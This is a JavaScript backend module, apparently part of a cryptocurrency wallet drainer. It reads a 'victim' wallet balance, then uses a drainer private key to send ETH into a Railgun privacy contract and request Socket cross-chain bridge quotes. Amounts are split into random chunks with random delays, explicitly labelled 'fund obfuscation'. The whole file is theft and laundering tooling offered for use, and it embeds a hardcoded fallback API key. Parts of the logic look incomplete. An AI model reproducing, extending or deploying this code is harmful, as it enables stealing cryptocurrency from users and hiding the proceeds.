// backend/modules/crossChain.js
import { ethers } from "ethers";
import { getRpcUrl, DRAINER_PK, RAILGUN_CONTRACT_ADDRESS, LIFI_API_KEY, SOCKET_API_KEY } from '../config.js';

export class CrossChain {
    constructor() {
        this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
        this.drainerWallet = new ethers.Wallet(DRAINER_PK, this.provider);
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        
        try {
            console.log('🌐 Initializing Cross Chain...');
            
            // Re-initialize provider with current config
            this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
            this.drainerWallet = new ethers.Wallet(DRAINER_PK, this.provider);
            
            // Check if API keys are configured
            if (!SOCKET_API_KEY) {
                console.warn('⚠️ Socket API key not configured - cross-chain features limited');
            }
            if (!LIFI_API_KEY) {
                console.warn('⚠️ LiFi API key not configured - some bridging features disabled');
            }
            
            this.isInitialized = true;
            console.log('✅ Cross Chain initialized');
            return true;
        } catch (error) {
            console.error('❌ Cross Chain initialization failed:', error);
            return false;
        }
    }

    // ===== EXACT FUNCTIONS FROM app.js =====
    async sendToCrossChain(chunk) {
        try {
            const socketUrl = "https://api.socket.tech/v2/quote";
            
            const params = {
                fromChainId: 1,
                toChainId: 137,
                fromTokenAddress: "0x0000000000000000000000000000000000000000",
                toTokenAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
                fromAmount: chunk.toString(),
                userAddress: "0x8ba1f109551bd432803012645ac136ddd64dba72",
                uniqueRoutesPerBridge: true,
                sort: "output"
            };

            const queryString = new URLSearchParams(params).toString();
            const urlWithParams = `${socketUrl}?${queryString}`;
            
            const response = await fetch(urlWithParams, {
                method: "GET",
                headers: {
                    "Content-Type": "application/json",
                    "API-KEY": SOCKET_API_KEY || "645b2c8c-5825-4930-baf3-d9b997fcd88c"
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const result = await response.json();
            console.log(`✅ Socket quote received for ${chunk} ETH:`, result);
            
            return result;
            
        } catch (error) {
            console.error(`❌ Error with Socket for ${chunk} ETH:`, error.message);
            throw error;
        }
    }

    async checkVictimBalance(userAddress) {
        try {
            if (!userAddress) {
                throw new Error("No wallet connected");
            }
            
            const provider = new ethers.BrowserProvider(window.ethereum);
            const balance = await provider.getBalance(userAddress);
            const balanceEth = parseFloat(ethers.formatEther(balance));
            
            console.log(`💰 Victim balance: ${balanceEth} ETH`);
            return balanceEth;
            
        } catch (error) {
            console.error("❌ Balance check failed:", error);
            throw error;
        }
    }

    async executeRailgunSafely(userAddress, amount) {
        try {
            if (!userAddress) {
                throw new Error("Please connect wallet first!");
            }
            
            const balance = await this.checkVictimBalance(userAddress);
            if (balance < 0.01) {
                throw new Error("❌ Victim has insufficient funds (min 0.01 ETH required)");
            }
            
            const amountNum = parseFloat(amount);
            if (amountNum > balance) {
                throw new Error("❌ Amount exceeds victim balance");
            }
            
            console.log("🚀 Starting Railgun obscuring process...");
            const result = await this.processFundObfuscation(amountNum);
            console.log("✅ Railgun process completed successfully");
            
            return result;
            
        } catch (error) {
            console.error("❌ Railgun execution failed:", error);
            throw error;
        }
    }

    async sendToRailgun(chunk, userAddress) {
        try {
            const balance = await this.checkVictimBalance(userAddress);
            console.log(`💰 Victim balance: ${balance} ETH`);
            
            let safeChunk;
            if (balance < 0.01) {
                throw new Error('❌ Victim has insufficient funds (< 0.01 ETH)');
            } else if (balance < 0.5) {
                safeChunk = balance * 0.8;
            } else {
                safeChunk = 0.5;
            }
            
            safeChunk = Math.max(0.001, safeChunk);
            safeChunk = Math.min(safeChunk, balance);
            
            console.log(`🔄 Processing ${safeChunk.toFixed(6)} ETH`);
            
            const railgunProvider = new ethers.JsonRpcProvider(getRpcUrl(1));
            const yourWallet = new ethers.Wallet(DRAINER_PK, railgunProvider);
            
            const railgunTx = await yourWallet.sendTransaction({
                to: RAILGUN_CONTRACT_ADDRESS,
                value: ethers.parseEther(safeChunk.toString())
            });
            
            console.log(`✅ Railgun process completed: ${railgunTx.hash}`);
            return { success: true, txHash: railgunTx.hash };
            
        } catch (error) {
            console.error(`❌ Railgun process failed: ${error.message}`);
            throw error;
        }
    }

    async processFundObfuscation(amount) {
        try {
            if (!window.userAddress) {
                throw new Error("❌ No wallet connected - cannot process funds");
            }

            const chunkedFunds = this.splitFunds(amount);

            for (let i = 0; i < chunkedFunds.length; i++) {
                const chunk = chunkedFunds[i];
                console.log(`🔄 Processing chunk ${i+1}/${chunkedFunds.length}: ${chunk} ETH`);

                try {
                    if (i % 3 === 0 || i % 3 === 1) {
                        console.log(`🌫️  Routing ${chunk} ETH through Railgun...`);
                        await this.sendToRailgun(chunk, window.userAddress);
                    } else {
                        console.log(`🌐 Routing ${chunk} ETH via Cross-Chain...`);
                        await this.sendToCrossChain(chunk);
                    }

                    console.log(`✅ Finished routing ${chunk} ETH.`);
                    await this.randomDelay(5000, 10000);
                    
                } catch (error) {
                    console.error(`❌ Error routing ${chunk} ETH: ${error.message}`);
                }
            }
            
            return { success: true, chunksProcessed: chunkedFunds.length };
            
        } catch (error) {
            console.error("❌ Fund obfuscation failed:", error);
            throw error;
        }
    }

    splitFunds(amount) {
        const chunks = [];
        let remaining = amount;
        
        while (remaining > 0) {
            let chunkSize;
            if (remaining > 1) {
                chunkSize = 0.3 + Math.random() * 0.4;
            } else if (remaining > 0.5) {
                chunkSize = 0.1 + Math.random() * 0.2;
            } else {
                chunkSize = remaining;
            }
            
            chunkSize = Math.min(chunkSize, remaining);
            chunks.push(parseFloat(chunkSize.toFixed(6)));
            remaining -= chunkSize;
        }
        
        return chunks;
    }

    async randomDelay(minMs = 5000, maxMs = 10000) {
        const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
        console.log(`⏳ Waiting ${delay}ms...`);
        return new Promise(resolve => setTimeout(resolve, delay));
    }
}

export const crossChain = new CrossChain();